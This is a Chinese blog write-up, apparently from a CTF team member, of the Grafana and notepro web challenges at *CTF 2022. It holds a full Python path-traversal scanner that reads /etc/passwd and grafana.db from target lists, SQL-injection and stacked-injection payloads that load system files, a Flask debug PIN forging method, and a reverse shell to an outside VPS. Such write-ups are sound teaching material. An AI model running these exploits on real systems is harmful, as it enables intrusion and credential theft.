@@ -1,0 +1,375 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><meta name="referrer" content="no-referrer"><title>记2022Xctf web-WriteUp | Anyyy安全小站</title><meta name="keywords" content="刷题,CTF"><meta name="author" content="Anyyy"><meta name="copyright" content="Anyyy"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="前言： 这次xctf难度确实大，misc一个不会过于真实。web倒是学到了很多东西 特别是notepro 学到了flask的pin码利用，sql堆叠注入等等。 SU战队大佬们嘎嘎带飞，师傅们tql。 总的来说还是学到很多东西的 受益匪浅 Web oh-my-grafana[solved] 百度搜索了一下Grafana是一个可视化测试数据的开源程序 直接搜索Grafana的漏洞后 发现存在任意文件读">
+<meta property="og:type" content="article">
+<meta property="og:title" content="记2022Xctf web-WriteUp">
+<meta property="og:url" content="http://www.anyiblog.top/2022/04/20/20220420/index.html">
+<meta property="og:site_name" content="Anyyy安全小站">
+<meta property="og:description" content="前言： 这次xctf难度确实大，misc一个不会过于真实。web倒是学到了很多东西 特别是notepro 学到了flask的pin码利用，sql堆叠注入等等。 SU战队大佬们嘎嘎带飞，师傅们tql。 总的来说还是学到很多东西的 受益匪浅 Web oh-my-grafana[solved] 百度搜索了一下Grafana是一个可视化测试数据的开源程序 直接搜索Grafana的漏洞后 发现存在任意文件读">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://cdn.anyiblog.top/common/1650422131077-48517457-7d0e-40e4-ae4f-4810291233d6.jpg">
+<meta property="article:published_time" content="2022-04-19T16:00:00.000Z">
+<meta property="article:modified_time" content="2023-05-07T07:36:01.013Z">
+<meta property="article:author" content="Anyyy">
+<meta property="article:tag" content="刷题">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://cdn.anyiblog.top/common/1650422131077-48517457-7d0e-40e4-ae4f-4810291233d6.jpg"><link rel="shortcut icon" href="http://cdn.anyiblog.top/img/favicon.png"><link rel="canonical" href="http://www.anyiblog.top/2022/04/20/20220420/"><link rel="preconnect" href="//fastly.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.json","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#121212","position":"top-right"},
+  source: {
+    justifiedGallery: {
+      js: 'https://fastly.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
+      css: 'https://fastly.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '记2022Xctf web-WriteUp',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: false,
+  postUpdate: '2023-05-07 15:36:01'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><div class="aplayer" data-id="7356458861" data-server="netease" data-type="playlist" data-fixed="true" data-listFolded="false" data-order="random" data-preload="none"></div><link rel="stylesheet" href="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.css"><script src="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.js"></script><script src="https://fastly.jsdelivr.net/npm/meting@1.2.0/dist/Meting.min.js"></script><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/background.css"><link rel="stylesheet" href="https://fastly.jsdelivr.net/gh/sviptzk/HexoStaticFile@latest/Hexo/css/flink.min.css"><link rel="stylesheet" href="https://fastly.jsdelivr.net/gh/sviptzk/HexoStaticFile@latest/Hexo/css/hideCategory.min.css"><script src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script><script src="/js/sweetalert.js"></script><link rel="stylesheet" href="/css/sweetalert.css"><!-- 仅首页弹窗通知 welcome--><!--link(rel="stylesheet" href="APlayer.min.css")--><div id="aplayer"></div><script src="http://cdn.anyiblog.top/js/Meting.min2.js" async></script><script src="http://cdn.anyiblog.top/js/Meting.min2.js" async></script><meta name="generator" content="Hexo 6.0.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="http://cdn.anyiblog.top/img/avatar.jpg" onerror="onerror=null;src='http://cdn.anyiblog.top/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">36</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">9</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">21</div></a></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div><div class="menus_item"><a class="site-page" href="/inform/"><i class="fa-fw fa-fw fa fa-coffee"></i><span> 通知</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="not-top-img" id="page-header"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Anyyy安全小站</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div><div class="menus_item"><a class="site-page" href="/inform/"><i class="fa-fw fa-fw fa fa-coffee"></i><span> 通知</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav></header><main class="layout" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">记2022Xctf web-WriteUp</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-04-19T16:00:00.000Z" title="发表于 2022-04-20 00:00:00">2022-04-20</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-05-07T07:36:01.013Z" title="更新于 2023-05-07 15:36:01">2023-05-07</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/">刷题笔记</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/Writeup/">Writeup</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">2.7k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>13分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="记2022Xctf web-WriteUp"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div><article class="post-content" id="article-container"><p>前言：</p>
+<p>这次xctf难度确实大，misc一个不会过于真实。web倒是学到了很多东西 特别是notepro 学到了flask的pin码利用，sql堆叠注入等等。</p>
+<p>SU战队大佬们嘎嘎带飞，师傅们tql。</p>
+<p>总的来说还是学到很多东西的 受益匪浅</p>
+<p>Web</p>
+<p>oh-my-grafana[solved]</p>
+<p><img src="http://cdn.anyiblog.top/common/1650420448808-b890b723-aea1-4a89-82b7-2f44e9b686ff.jpg"><br>百度搜索了一下Grafana是一个可视化测试数据的开源程序</p>
+<p>直接搜索Grafana的漏洞后 发现存在任意文件读取漏洞：</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36197704/article/details/123480175">https://blog.csdn.net/qq_36197704&#x2F;article&#x2F;details&#x2F;123480175</a></p>
+<p><img src="http://cdn.anyiblog.top/common/1650420450816-eec60651-59ab-42ba-b5bc-1e5ddc75baa3.jpg">  </p>
+<p>漏洞原理大致就是通过一些插件ID路径存在目录遍历漏洞 导致了可以构造恶意url进行读取文件。</p>
+<p>Burpsuite构造：</p>
+<p><img src="http://cdn.anyiblog.top/common/1650420452270-a4923282-8258-44bb-8957-dab5bb93ac78.jpg"><br>同时可以读取grafana的配置文件：<br><img src="http://cdn.anyiblog.top/common/1650420453547-de29e4fc-a7d1-41e9-a0ee-4e1cf089daa8.jpg"><br>POC：（原脚本有些问题 修改后可以下载配置文件）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- conding:utf-8 -*-</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">import requests</span><br><span class="line">import argparse</span><br><span class="line">import sys</span><br><span class="line">import urllib3</span><br><span class="line">import time</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">urllib3.disable_warnings()</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">def title():</span><br><span class="line">    print(&quot;&quot;&quot;</span><br><span class="line">                 ___                     __                                 ___                        _      ___   _   _      </span><br><span class="line">                / __|  _ _   __ _   / _|  __ _   _ _    __ _     | _ \  ___   __ _   __| |    | __| (_) | |  ___</span><br><span class="line">               | (_ | | &#x27;_| / _` | |  _| / _` | | &#x27; \  / _` |    |  / / -_) / _` | / _` |   | _|  | | | | / -_)</span><br><span class="line">               \___| |_|   \__,_| |_|   \__,_| |_||_| \__,_|  |_|_\ \___| \__,_| \__,_| |_|   |_| |_| \___|</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">                                     Author: Henry4E36</span><br><span class="line">               &quot;&quot;&quot;)</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">class information(object):</span><br><span class="line">    def __init__(self, args):</span><br><span class="line">        self.args = args</span><br><span class="line">        self.url = args.url</span><br><span class="line">        self.file = args.file</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    def target_url(self):</span><br><span class="line">        lists = [&#x27;grafana-clock-panel&#x27;, &#x27;alertGroups&#x27;, &#x27;alertlist&#x27;, &#x27;alertmanager&#x27;, &#x27;annolist&#x27;, &#x27;barchart&#x27;, &#x27;bargauge&#x27;, \</span><br><span class="line">                 &#x27;canvas&#x27;, &#x27;cloudwatch&#x27;, &#x27;cloudwatch&#x27;, &#x27;dashboard&#x27;, &#x27;dashboard&#x27;, &#x27;dashlist&#x27;, &#x27;debug&#x27;, &#x27;elasticsearch&#x27;, \</span><br><span class="line">                 &#x27;gauge&#x27;, &#x27;geomap&#x27;, &#x27;gettingstarted&#x27;, &#x27;grafana-azure-monitor-datasource&#x27;, &#x27;grafana&#x27;, &#x27;graph&#x27;,</span><br><span class="line">                 &#x27;graphite&#x27;, \</span><br><span class="line">                 &#x27;graphite&#x27;, &#x27;heatmap&#x27;, &#x27;histogram&#x27;, &#x27;influxdb&#x27;, &#x27;jaeger&#x27;, &#x27;live&#x27;, &#x27;logs&#x27;, &#x27;logs&#x27;, &#x27;loki&#x27;, &#x27;mixed&#x27;, \</span><br><span class="line">                 &#x27;mssql&#x27;, &#x27;mysql&#x27;, &#x27;news&#x27;, &#x27;nodeGraph&#x27;, &#x27;opentsdb&#x27;, &#x27;piechart&#x27;, &#x27;pluginlist&#x27;, &#x27;postgres&#x27;, &#x27;prometheus&#x27;, \</span><br><span class="line">                 &#x27;stat&#x27;, &#x27;state-timeline&#x27;, &#x27;status-history&#x27;, &#x27;table-old&#x27;, &#x27;table&#x27;, &#x27;tempo&#x27;, &#x27;testdata&#x27;, &#x27;text&#x27;, \</span><br><span class="line">                 &#x27;timeseries&#x27;, &#x27;welcome&#x27;, &#x27;xychart&#x27;, &#x27;zipkin&#x27;]</span><br><span class="line">        headers = &#123;</span><br><span class="line">            &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:87.0) Gecko/20100101 Firefox/87.0&quot;,</span><br><span class="line">        &#125;</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">        # proxies = &#123;</span><br><span class="line">        #     &quot;http&quot;: &quot;http://127.0.0.1:8080&quot;,</span><br><span class="line">        #</span><br><span class="line">        # &#125;</span><br><span class="line">        for i in lists:</span><br><span class="line">            target_url = self.url + f&quot;/public/plugins/&#123;i&#125;/%23/../..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd&quot;</span><br><span class="line">            try:</span><br><span class="line">                res = requests.get(url=target_url, headers=headers, verify=False, timeout=5)</span><br><span class="line">                if res.status_code == 200 and &quot;root:&quot; in res.text:</span><br><span class="line">                    print(f&quot;\033[31m[&#123;chr(8730)&#125;] 目标系统: &#123;self.url&#125;的&#123;i&#125;插件存在任意文件读取\033[0m&quot;)</span><br><span class="line">                    print(f&quot;[-] 尝试读取DB文件:&quot;)</span><br><span class="line">                    db_url = self.url + f&quot;/public/plugins/&#123;i&#125;/%23/../..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f/var/lib/grafana/grafana.db&quot;</span><br><span class="line">                    try:</span><br><span class="line">                        res_db = requests.get(url=db_url, headers=headers, verify=False, timeout=25)</span><br><span class="line">                        if res_db.status_code == 200 and &quot;SQLite format&quot; in res_db.text:</span><br><span class="line">                            a = time.time()</span><br><span class="line">                            with open(f&#x27;&#123;a&#125;.db&#x27;, &quot;wb&quot;) as f:</span><br><span class="line">                                f.write(res_db.content)</span><br><span class="line">                            f.close()</span><br><span class="line">                            print(f&quot;\033[31m[&#123;chr(8730)&#125;] 成功读取DB文件，信息保存在&#123;a&#125;.db文件中\033[0m&quot;)</span><br><span class="line">                            break</span><br><span class="line">                        else:</span><br><span class="line">                            print(f&quot;[-] 读取DB文件失败&quot;)</span><br><span class="line">                    except Exception as e:</span><br><span class="line">                        print(e)</span><br><span class="line">                        print(&quot;[\033[31mX\033[0m] 读取DB文件错误,可能与请求时间有关!&quot;)</span><br><span class="line">                        print(&quot;[&quot; + &quot;-&quot; * 100 + &quot;]&quot;)</span><br><span class="line">                else:</span><br><span class="line">                    print(f&quot;[\033[31mx\033[0m]  目标系统: &#123;self.url&#125; 不存在&#123;i&#125;插件！&quot;)</span><br><span class="line">                    print(&quot;[&quot; + &quot;-&quot; * 100 + &quot;]&quot;)</span><br><span class="line">            except Exception as e:</span><br><span class="line">                print(&quot;[\033[31mX\033[0m]  连接错误！&quot;)</span><br><span class="line">                print(&quot;[&quot; + &quot;-&quot; * 100 + &quot;]&quot;)</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    def file_url(self):</span><br><span class="line">        with open(self.file, &quot;r&quot;) as urls:</span><br><span class="line">            for url in urls:</span><br><span class="line">                url = url.strip()</span><br><span class="line">                if url[:4] != &quot;http&quot;:</span><br><span class="line">                    url = &quot;http://&quot; + url</span><br><span class="line">                self.url = url.strip()</span><br><span class="line">                information.target_url(self)</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    title()</span><br><span class="line">    parser = ar = argparse.ArgumentParser(description=&#x27;Grafana 任意文件读取&#x27;)</span><br><span class="line">    parser.add_argument(&quot;-u&quot;, &quot;--url&quot;, type=str, metavar=&quot;url&quot;, help=&quot;Target url eg:\&quot;http://127.0.0.1\&quot;&quot;)</span><br><span class="line">    parser.add_argument(&quot;-f&quot;, &quot;--file&quot;, metavar=&quot;file&quot;, help=&quot;Targets in file  eg:\&quot;ip.txt\&quot;&quot;)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    if len(sys.argv) != 3:</span><br><span class="line">        print(</span><br><span class="line">            &quot;[-]  参数错误！\neg1:&gt;&gt;&gt;python3 grafana-read.py -u [url]http://127.0.0.1[/url]\neg2:&gt;&gt;&gt;python3 grafana-read.py -f ip.txt&quot;)</span><br><span class="line">    elif args.url:</span><br><span class="line">        information(args).target_url()</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    elif args.file:</span><br><span class="line">        information(args).file_url()</span><br></pre></td></tr></table></figure>
+<p>这里的弯路就是将配置文件保存db下载后 导入sqlite等数据库软件 发现admin的password 但是有salt 所以又没有了思路</p>
+<p><img src="http://cdn.anyiblog.top/common/1650420454844-9b72c9a4-559b-43ce-8702-25256d1f658d.jpg"><br>后来发现目标靶机存在ssh服务 想通过某些用户弱口令进入 但是无果也卡了。</p>
+<p>最后找到一篇文章 里面有讲grafana的主要文件 这里grafana.ini是关键：</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/yanzi2020/p/14484227.html">https://www.cnblogs.com/yanzi2020/p/14484227.html</a></p>
+<p><img src="http://cdn.anyiblog.top/common/1650420455437-f48ae717-c50b-40c0-bb26-67b11ce6efb5.jpg"><br>用burpsuite读取下 </p>
+<p>EXP:&#x2F;public&#x2F;plugins&#x2F;alertlist&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;grafana&#x2F;grafana.ini</p>
+<p><img src="http://cdn.anyiblog.top/common/1650420457499-5214d6aa-075f-449e-be3b-74b01a0a9e6a.jpg"><br>得到密码后直接登录后台即可，这里密码就是这么长 不用反解。</p>
+<p>admin 5f989714e132c9b04d4807dafeb10ade</p>
+<p><img src="http://cdn.anyiblog.top/common/1650420458778-80230fd7-1540-42e9-8db8-ec1a904158f6.jpg"><br>因为环境没有docker 所以多人登录会被挤下去 多换几台靶机即可。</p>
+<p>进来后也卡了一会儿 因为没有用过grafana 在网上找教程，大致了解可以通过mysql进行查询 但是不知道具体怎么操作</p>
+<p>甚至想怎么通过后台去RCE hhhh</p>
+<p>后来自己琢磨了一下 发现这个table点一下就有表：（复现的时候发现很多环境mysql都被删了 所以共用环境体验是真的不好）</p>
+<p><img src="http://cdn.anyiblog.top/common/1650420459796-7ffc3882-77d4-463a-8fa3-225e8dd248ce.jpg"><br>有了表之后编辑sql语句就行了 这里的按钮确实看不懂用不明白</p>
+<p><img src="http://cdn.anyiblog.top/common/1650420460928-757131b4-0a85-4e56-a989-960d6212e648.jpg">  </p>
+<p>SELECT * FROM fffffflllllllllaaaagggggg 运行即可<br><img src="http://cdn.anyiblog.top/common/1650420462090-86cc5e02-b435-49fd-8008-6c24624966fe.jpg"><br>FLAG:*ctf{Upgrade_your_grafAna_now!}</p>
+<p>oh-my-notepro[unsolved]</p>
+<p>sql注入 + flask debug PIN码构造</p>
+<p>后台admin admin 登录</p>
+<p>Create Note 创建一条留言</p>
+<p><img src="http://cdn.anyiblog.top/common/1650420462888-69497330-3966-44fe-8312-ed5924ad1298.jpg"><br>将note_id改为1后报错  很明显是flask了</p>
+<p><img src="http://cdn.anyiblog.top/common/1650420464751-f1b56d83-6ffc-4224-9fbb-79e9ec5ddae2.jpg"><br>尝试sql注入：</p>
+<p>1’ or 1&#x3D;1 %23<br><img src="http://cdn.anyiblog.top/common/1650420466361-16153fbd-fbc4-44c4-b805-b74d4ddce18a.jpg"><br>正常回显 发现是存在sql注入的 且为回显型</p>
+<p>通过查询发现有5个字段</p>
+<p><img src="http://cdn.anyiblog.top/common/1650420467630-1ef9ab54-80cf-4f15-a8da-e52066e17a8a.jpg"><br>查询数据库：</p>
+<p>1’ union select 1,2,3,version(),database() %23</p>
+<p><img src="http://cdn.anyiblog.top/common/1650420468873-dbc5c00e-4c88-4dc9-82d1-004adbe3ec2f.jpg"><br>查询ctf表中所有表：</p>
+<p>1’ union select 1,2,3,group_concat(table_name),5 from information_schema.tables where table_schema&#x3D;database() %23</p>
+<p><img src="http://cdn.anyiblog.top/common/1650420470124-a057f152-35e0-4c3c-97fc-335c089f1ad5.jpg"><br>字段：</p>
+<p>1’ union select 1,2,3,group_concat(column_name),5 from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’ctf’ limit 0,1%23</p>
+<p>当时查询的结果：</p>
+<p>notes id username note_id text title<br>result value<br>tlsres100 cmd<br>users  id username password</p>
+<p>tlsres100的内容好像是py的源码 后来就没做了。</p>
+<p>复现的时候才发现这里sql注入不仅能查询 还存在堆叠注入 即可以创建表 - -  所以之前查询的可能都是别人创建的东西</p>
+<p>flask的内容很多还不会，以上为我自己的做法，以下是自己参考大佬做法学到的</p>
+<p>参考群里大佬们交流预期解应该是：</p>
+<p>获取PIN码需要的东西，通过脚本构造flask debug的PIN码 然后就能拿到python shell 最后反弹下shell即可。</p>
+<p>构造PIN码需要：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.flask所登录的用户名</span><br><span class="line">2.modname</span><br><span class="line">3.getattr(app, “name”, app.class.name)</span><br><span class="line">4.getattr(mod, &#x27;__file__&#x27;, None) flask库下app.py的绝对路径</span><br><span class="line">5.uuid.getnode() 当前网络的mac地址的十进制数</span><br><span class="line">6.get_machine_id() docker机器id</span><br></pre></td></tr></table></figure>
+<p>其中2.3.4都是可以默认获取的，用户名用&#x2F;etc&#x2F;passwd获取 mac地址用&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address docker的id Linux用&#x2F;etc&#x2F;machine-id Docker用&#x2F;proc&#x2F;self&#x2F;cgroup</p>
+<p>而pin码需要的东西需要用到sql注入去读取文件，这里sql注入直接是读取不到文件的，因为有堆叠注入 所以可以通过堆叠注入创建一个表 然后将需要的文件内容写到表里面 最后查询表的内容获取用户名、mac地址、docker id。最后通过脚本构造PIN 反弹shell就能拿到flag了</p>
+<p><img src="http://cdn.anyiblog.top/common/1650420471894-6d41604d-ff56-443c-b8e1-d28af0a192e4.jpg"><br>进行python shell交互模式后 开一个外网vps nc -lvvp port</p>
+<p>这边python用socket连接ip:port</p>
+<p>拿到shell后直接找flag即可。</p>
+<p>实践一下：</p>
+<p>创建表：1’;create table imtest(data text);%23</p>
+<p>添加mac地址：1’;LOAD DATA LOCAL INFILE “&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address” INTO TABLE imtest;%23</p>
+<p>docker id（这里要&#x2F;etc&#x2F;machine-id + &#x2F;proc&#x2F;self&#x2F;cgroup的id加在一起）: <br>1’;LOAD DATA LOCAL INFILE “&#x2F;etc&#x2F;machine-id” INTO TABLE imtest;%23<br>1’;LOAD DATA LOCAL INFILE “&#x2F;proc&#x2F;self&#x2F;cgroup” INTO TABLE imtest;%23</p>
+<p>username：1’;LOAD DATA LOCAL INFILE “&#x2F;etc&#x2F;passwd” INTO TABLE imtest;%23</p>
+<p>查询: 1’union select 1,2,3,group_concat(data),5 from imtest %23</p>
+<p><img src="http://cdn.anyiblog.top/common/1650420472847-5c526817-876b-4ed6-88e6-375e848bd5af.jpg"><br><img src="http://cdn.anyiblog.top/common/1650420473855-61043cc4-5495-4dff-a93d-fdd4fbfac3ba.jpg">  </p>
